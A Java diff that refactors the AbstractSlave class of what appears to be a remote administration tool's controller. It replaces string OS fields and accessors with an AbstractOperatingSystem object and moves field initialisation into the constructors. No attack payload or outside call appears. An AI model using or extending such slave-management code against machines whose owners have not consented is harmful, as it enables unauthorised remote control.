@@ -54,28 +54,28 @@ public abstract class AbstractSlave implements Runnable {
 	protected PublicKey rsaKey;
 	protected byte[] key;
 	protected byte[] iv;
-	protected boolean responded = false;
-	protected boolean verified = false;
-	protected boolean checked = false;
-	protected boolean selected = false;
-	protected boolean lock = false;
+	protected boolean responded;
+	protected boolean verified;
+	protected boolean checked;
+	protected boolean selected;
+	protected boolean lock;
 	protected long pingms = 0;
 	protected long sent = 0;
 	protected long received = 0;
-	protected final long uniqueId = (long) (new Random()).nextInt(Integer.MAX_VALUE); // TODO change to int
+	protected final long uniqueId;
 	protected int ping = 0;
 	protected String id;
 	protected String username;
 	protected ImageIcon thumbnail;
 	protected String version;
-	protected String osname;
-	protected String arch;
-	protected String longOsname;
+	protected AbstractOperatingSystem os;
 
 	private String ip;
 	private String host;
 
 	public AbstractSlave(ServerListener connection, Socket socket) {
+		uniqueId = (long) (new Random()).nextInt(Integer.MAX_VALUE); // TODO change to int
+		
 		this.connection = connection;
 		this.socket = socket;
 
@@ -152,10 +152,11 @@ public abstract class AbstractSlave implements Runnable {
 	}
 
 	public AbstractSlave(String ip) {
+		uniqueId = (long) (new Random()).nextInt(Integer.MAX_VALUE); // TODO change to int
+ 
 		this.ip = ip;
 	}
 	
-
 	public void writeLine(String s) {
 		try {
 			dos.writeShort(s.length());
@@ -396,33 +397,7 @@ public abstract class AbstractSlave implements Runnable {
 	public ImageIcon getFlag() {
 		return FlagUtils.getFlag(country);
 	}
-	
-	public String getArch() {
-		return arch;
-	}
-	
-	public void setArch(String arch) {
-		this.arch = arch;
-	}
 
-	public String getOperatingSystem() {
-		return osname;
-	}
-
-	public void setOperatingSystem(String osname) {
-		this.osname = osname;
-		
-		Frame.mainModel.setValueAt(getOperatingSystem(), Utils.getRow(3, getIP()), 6);
-	}
-	
-	public String getLongOperatingSystem() {
-		return longOsname;
-	}
-	
-	public void setLongOperatingSystem(String longOsname) {
-		this.longOsname = longOsname;
-	}
-	
 	public void setCountry(String country) {
 		this.country = country;
 		
@@ -437,9 +412,14 @@ public abstract class AbstractSlave implements Runnable {
 		CountryStatistics.getGlobal().add(this);
 	}
 
-	public AbstractOperatingSystem getOS() {
-		String os = this.getOperatingSystem().toLowerCase();
-		return OperatingSystem.getOperatingSystem(os);
+	public void setOperatingSystem(AbstractOperatingSystem os) {
+		this.os = os;
+		
+		Frame.mainModel.setValueAt(os.getDisplayString(), Utils.getRow(3, getIP()), 6);
+	}
+
+	public AbstractOperatingSystem getOperatingSystem() {
+		return os;
 	}
 
 	public String getComputerName() {
@@ -466,7 +446,7 @@ public abstract class AbstractSlave implements Runnable {
 		
 		String s;
 		
-		if (this.getOS().getType() == OperatingSystem.WINDOWS) {
+		if (this.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 			s = computerName + "\\" + username;
 		} else {
 			s = username + "@" + computerName;
